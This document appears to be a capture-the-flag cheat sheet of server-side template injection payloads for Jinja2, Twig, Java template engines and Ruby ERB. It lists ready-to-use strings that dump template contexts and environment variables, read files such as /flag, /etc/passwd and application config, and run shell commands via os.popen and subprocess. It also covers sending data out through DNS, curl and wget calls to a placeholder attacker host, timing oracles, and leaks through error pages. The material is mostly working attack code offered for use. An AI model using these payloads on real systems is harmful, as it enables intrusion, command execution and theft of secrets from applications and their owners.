# Extraction depth — data out of eval-contexts

Once you can eval: enumerate, read, exfil. This file is the
operations layer — the loops and paths for getting data out of
each engine family.

---

## 1. The context-enumeration loop — Python-side

```jinja2
{%for k,v in _context.items()%}{{k}} : {{v}}<br>{%endfor%}
{%for c in ''.__class__.__mro__[1].__subclasses__()%}
  {{loop.index}} {{c.__name__}} :: {{c.__module__}}<br>
{%endfor%}
{%for k in lipsum.__globals__%}{{k}}<br>{%endfor%}
{%for k in config%}{{k}}={{config[k]}}<br>{%endfor%}
{{config.items()|list}}
{{self.__init__.__globals__.keys()}}
{{request.environ.items()}}
{{lipsum.__globals__.os.environ.items()}}
```

Loop-and-dump — `{%for k,v in x.items()%}` gives the whole table.

## 2. Directory + file enumeration

```jinja2
{{lipsum.__globals__.os.listdir('/')}}
{{lipsum.__globals__.os.listdir('/app')}}
{{lipsum.__globals__.os.listdir('.')}}
{{lipsum.__globals__.os.getcwd()}}
{{lipsum.__globals__.os.walk('/app')}}          -- full tree —
                                                output big
{{lipsum.__globals__.os.popen('ls -la /').read()}}
{{lipsum.__globals__.os.popen('find / -name "*flag*" 2>/dev/null').read()}}
   -- the flag-HUNT — find/grep for flag-named files
{{lipsum.__globals__.os.popen('env').read()}}   -- env via shell
{{lipsum.__globals__.os.popen('cat /proc/self/environ').read()}}
```

`find / -name "*flag*"` inside `popen` — the flag-file hunt —
standard CTF layout `/flag`, `/flag.txt`, `/app/flag`.

## 3. The file-read loop — candidates

```text
/flag /flag.txt /flag* /app/flag /tmp/flag
/proc/self/environ           — env-vars including flag
/proc/self/cmdline           — how the app launched — paths
/proc/self/cwd/...           — app-dir relative
/etc/passwd                  — proof-of-read
/app/app.py /app/main.py     — source — secrets in source
/app/config.py /app/.env     — config files
/app/templates/flag.html     — flag in a template
~/.bash_history /root/flag   — home-dirs
```

`read_loop` walks a wordlist once the read-primitive is proven —
it baseline-classifies 404-vs-read success.

## 4. PHP-side enumeration

```twig
{{_context|keys}}                             -- bound-var names
{{app.request.server}}                         -- $_SERVER dump
{{app.request.server.get('FLAG')}}
{{app.request.query}} {{app.request.request}}  -- params
{{app.request.cookies}}
{{app.request.headers}}
{{app.user}} {{app.user.password}}             -- model fields
{{constant('FLAG')}}                            -- php constants —
                                                 if fn bound
{{['getenv','FLAG']|map('call_user_func')}}     -- fn-call trick
{{['scandir','/']|map('call_user_func')}}
{{['file_get_contents','/flag']|map('call_user_func')}}
{{['glob','/*flag*']|map('call_user_func')}}
{{'/flag'|file_get_contents}}                   -- if filter-mapped
{{'/flag'|readfile}}
```

`call_user_func` via map — two-element array `[fn, arg]` —
`call_user_func(fn, arg)` — the portable fn-call shape.

## 5. Java-side enumeration

```java
// Velocity/Pebble/Jinjava — Class-methods walk:
$x.class.methods                              -- method inventory
$x.class.declaredMethods
$x.class.forName('java.lang.System').getenv()  -- env map
$x.class.forName('java.lang.System').getenv('FLAG')
$x.class.forName('java.lang.Runtime').getRuntime().exec('env')
$x.class.forName('java.util.Scanner').getConstructor(...).newInstance(
  new File('/flag')).useDelimiter('\\Z').next()  -- whole file
// FreeMarker:
${.data_model?keys}                            -- model keys
${.main} ${.namespace} ${.env}                 -- FM internals
<#list .data_model?keys as k>${k}=${.data_model[k]}</#list>
```

`System.getenv` — the env-map — `.getenv('FLAG')` for the var.

## 6. The subprocess detail — Popen/read all the way

```jinja2
{{lipsum.__globals__.subprocess.Popen('cat /flag',shell=True,stdout=-1).communicate()[0]}}
{{lipsum.__globals__.subprocess.check_output('cat /flag',shell=True)}}
{{lipsum.__globals__.subprocess.check_output(['cat','/flag'])}}
{{lipsum.__globals__.subprocess.getoutput('cat /flag')}}
{{lipsum.__globals__.subprocess.getstatusoutput('cat /flag')}}
```

`check_output`/`getoutput` — simpler than Popen — returns bytes.

## 7. The out-of-band exfil — no response channel

```text
DNS:    cmd = 'dig $(cat /flag|xxd -p|head -c40).exfil.you.com'
        or ping — DNS survives egress-blocks
HTTP:   curl http://you/?d=$(cat /flag|base64)
        wget --post-data "$(cat /flag)" http://you/
        python -c "urllib..."
socket: python one-liner — raw TCP — when curl absent
Write:  > /var/www/html/x.txt → GET /x.txt — write-to-webroot
Redirect: cmd output → a world-readable path the app serves
```

`oob_listener` runs the catch — the callback-URL is your argument.

## 8. The time-sidechannel loop — last resort

```jinja2
{% if lipsum.__globals__.os.popen('head -c1 /flag').read()=='f' %}
  {{lipsum.__globals__.time.sleep(3)}}
{% endif %}
   — binary-oracle — per-byte — SLOW — only when no channel
{% set x = lipsum.__globals__.os.popen('cat /flag').read() %}
{% if x[0:1]=='f' %}{{lipsum.__globals__.time.sleep(3)}}{%endif%}
```

`time.sleep` — if `time` module reachable — boolean→timing —
see blind-ssti.md for the full oracle pattern.

## 9. The error-exfil trick — output via exception

```jinja2
{{lipsum.__globals__.os.popen('cat /flag; exit 1').read()}}
   — stderr? — error doesn't reach you
{{lipsum.__globals__.os.popen('cat /flag 1>&2').read()}}
   — stderr-redirect — error-PAGE may show it
{{(lipsum.__globals__.__builtins__.exec("raise Exception(open('/flag').read())"))}}
   — raise the content — the error-page renders it
{{'x'.__class__.__mro__[1].__subclasses__()[N]('/flag')}}
   — if File-class → raises with content in args
```

Ruby: `<%=raise File.read('/flag')%>` — the exception PAGE shows
the file — ERB's error-channel is the fastest read.

## 10. The chunk-encode trick — binary over text

```jinja2
{{lipsum.__globals__.os.popen('cat /flag|base64').read()}}
{{lipsum.__globals__.os.popen('xxd -p /flag').read()}}
{{lipsum.__globals__.base64.b64encode(open('/flag','rb').read())}}
   — base64 the bytes — render survives binary
```

Binary flags/keys — base64 via popen or the `base64` module —
renderable text over the response channel.
